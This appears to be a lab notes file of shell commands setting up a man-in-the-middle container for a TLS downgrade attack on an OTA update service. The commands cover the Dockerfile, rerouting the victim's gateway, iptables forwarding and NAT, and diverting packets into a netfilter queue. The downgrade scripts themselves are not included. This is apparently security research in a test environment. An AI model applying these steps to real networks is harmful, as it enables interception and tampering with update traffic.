######### TLS downgrade  attack ##############
######### Name: Amelia Andronescu
######### Date: 16/06/2024
######### Description:
TLS downgrade attack prerequisites
##############################################

######### Steps:

# create docker MITM 
mkdir -p ~/downgrade
cd ~/downgrade
cat > Dockerfile << EOF
FROM ubuntu:latest                                  
                                                     
RUN apt-get update
RUN apt-get install -y --no-install-recommends apt-utils nano iptables python3 python3-pip tcpdump
RUN apt-get install -y --no-install-recommends net-tools python3-dev build-essential libnetfilter-queue-dev
RUN pip3 install --upgrade pip
RUN pip3 install setuptools
RUN pip3 install NetfilterQueue
RUN pip3 install scapy-python3

WORKDIR /work
CMD ["sleep", "9999999"]                            
EOF

docker build -t mitm_machine .  
docker run -d  --net=ota-community-edition_default --cap-add=NET_ADMIN -v=~/downgrade:/work --name=mitm mitm_machine

# find mitm docker's IP
docker exec -it mitm ifconfig eth0 | head -n 2 | tail -n 1

# find nginx docker's IP (the one you want to intercept its traffic)
docker inspect \
  -f '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}' container_id

# change the default gateway of the server nginx docker to our mitm
route del default
sudo ip route add <victim_ip> via <mitm_ip>

# check the routes
netstat -anr

# the mitm machine has to have the IP_FORWARD flag set to 1 to be able to forward the packets
received, otherwise it will drop them all
# check it like below

docker exec -it <mitm_docker_id> /bin/bash
sysctl net.ipv4.ip_forward

# add iptable rules on mitm docker to be able to allow forwarding packets
# note: br-20c9a5233718 is the client interface
iptables -A FORWARD -i br-20c9a5233718 -j ACCEPT

# add iptable rule rewrites the source IP of forwarded packets
# as the MitM machine's IP, to receive the potential replies
iptables -t nat -A POSTROUTING -o br-20c9a5233718 -j MASQUERADE

# now fire up the wireshark on the mitm interface to check that it's working :)

### capturing the traffic with netfilter queue

# make the victim lose Internet conectivity
iptables -D FORWARD -i br-20c9a5233718 -j ACCEPT

# store the packets "on the fly" in a netfilter queue
iptables -A FORWARD -j NFQUEUE --queue-num 0

# copy the python scripts on the mitm docker and run it while performing an ota update 